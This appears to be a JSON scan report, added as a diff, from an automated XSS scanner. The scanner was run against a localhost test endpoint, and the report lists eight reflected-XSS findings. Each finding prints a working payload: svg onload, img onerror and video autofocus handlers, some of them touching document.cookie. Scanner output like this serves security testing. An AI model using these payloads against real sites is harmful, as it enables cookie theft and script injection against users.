@@ -1,0 +1,160 @@
+{
+  "meta": {
+    "scanId": "62587fda-d7d2-4545-ad2b-321ab30c28a4",
+    "target": "http://localhost:9090/reflected/body?q=test",
+    "status": "REPORTING",
+    "createdAt": "2026-03-02T02:29:46.989Z",
+    "completedAt": null,
+    "options": {
+      "depth": 3,
+      "maxParams": 100,
+      "verifyExecution": true,
+      "wafBypass": true,
+      "maxPayloadsPerParam": 50,
+      "timeout": 60000,
+      "reportFormat": [
+        "html",
+        "json"
+      ]
+    },
+    "generatedAt": "2026-03-02T02:30:05.471Z",
+    "version": "0.1.0"
+  },
+  "summary": {
+    "totalVulns": 8,
+    "critical": 0,
+    "high": 6,
+    "medium": 2,
+    "low": 0
+  },
+  "vulnerabilities": [
+    {
+      "id": "c2cc3c00-6d58-4c47-af89-fbd1e46928b4",
+      "param": "q",
+      "payload": "<svg onmouseover=() onload=(confirm)(document.cookie)>",
+      "type": "reflected_xss",
+      "severity": "HIGH",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": true
+      },
+      "discoveredAt": "2026-03-02T02:30:05.470Z"
+    },
+    {
+      "id": "08e5c29c-bb0d-4f04-bb71-96191d8c1012",
+      "param": "q",
+      "payload": "<svg onx=() onload=(confirm)(document.cookie)>",
+      "type": "reflected_xss",
+      "severity": "HIGH",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": true
+      },
+      "discoveredAt": "2026-03-02T02:30:05.470Z"
+    },
+    {
+      "id": "3433a991-5e15-4211-b71b-c802bd5f0c6f",
+      "param": "q",
+      "payload": "\"><img/ src=x onerror=javascript:alert(`A`)>",
+      "type": "reflected_xss",
+      "severity": "HIGH",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": true
+      },
+      "discoveredAt": "2026-03-02T02:30:05.470Z"
+    },
+    {
+      "id": "892ca5b9-ecc0-4bc5-9f5c-ce6825424ef9",
+      "param": "q",
+      "payload": "\"><img src=x onerror=javascript:self.alert(1)>",
+      "type": "reflected_xss",
+      "severity": "HIGH",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": true
+      },
+      "discoveredAt": "2026-03-02T02:30:05.470Z"
+    },
+    {
+      "id": "beada1bf-5891-4953-b4eb-973481c274b3",
+      "param": "q",
+      "payload": "\"><img src=x onerror=javascript:alert(`A`)>",
+      "type": "reflected_xss",
+      "severity": "HIGH",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": true
+      },
+      "discoveredAt": "2026-03-02T02:30:05.470Z"
+    },
+    {
+      "id": "a49c39ee-d3ec-4bd8-becb-6fde6dc8ad3a",
+      "param": "q",
+      "payload": "<img/src/onerror=print()",
+      "type": "reflected_xss",
+      "severity": "MEDIUM",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": false
+      },
+      "discoveredAt": "2026-03-02T02:30:05.470Z"
+    },
+    {
+      "id": "e9c0d1c4-059a-41da-b537-71c2eecef40f",
+      "param": "q",
+      "payload": "<video onfocus=alert(1) autofocus tabindex=1>",
+      "type": "reflected_xss",
+      "severity": "HIGH",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": true
+      },
+      "discoveredAt": "2026-03-02T02:30:05.470Z"
+    },
+    {
+      "id": "fac79071-d12d-48da-b60e-dc760ec6202f",
+      "param": "q",
+      "payload": "<img/src/onerror=alert(1)",
+      "type": "reflected_xss",
+      "severity": "MEDIUM",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": false
+      },
+      "discoveredAt": "2026-03-02T02:30:05.471Z"
+    }
+  ]
+}
